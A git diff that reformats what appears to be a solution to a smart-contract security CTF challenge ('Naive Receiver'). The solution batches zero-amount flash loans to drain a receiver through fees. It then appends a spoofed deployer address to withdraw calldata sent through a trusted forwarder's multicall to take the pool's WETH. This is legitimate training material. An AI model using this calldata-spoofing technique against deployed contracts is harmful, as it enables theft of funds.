@@ -77,14 +77,14 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
         bytes[] memory datas = new bytes[](11);
         // 10 flashloan calls with amount = 0
-        for (uint i = 0; i < 10; i++) {
+        for (uint256 i = 0; i < 10; i++) {
             datas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
         }
-        // 11th operation - encoded withdraw both weth in pool + reciever (drained as fees), 
-        datas[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))), 
+        // 11th operation - encoded withdraw both weth in pool + reciever (drained as fees),
+        datas[10] = abi.encodePacked(
+            abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
             bytes32(uint256(uint160(deployer)))
         );
 
@@ -92,9 +92,13 @@ contract NaiveReceiverChallenge is Test {
         bytes memory multiData = abi.encodeCall(pool.multicall, datas);
 
         // Creating a request using the BasicForwarder contract
-        BasicForwarder.Request memory request = BasicForwarder.Request(player, address(pool), 0, gasleft(), forwarder.nonces(player), multiData, 1 days);
+        BasicForwarder.Request memory request =
+            BasicForwarder.Request(player, address(pool), 0, gasleft(), forwarder.nonces(player), multiData, 1 days);
         // Generating the signature using pk
-        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request))));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
+            playerPk,
+            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)))
+        );
         // Execute the request through the forwarder
         forwarder.execute(request, abi.encodePacked(r, s, v));
     }
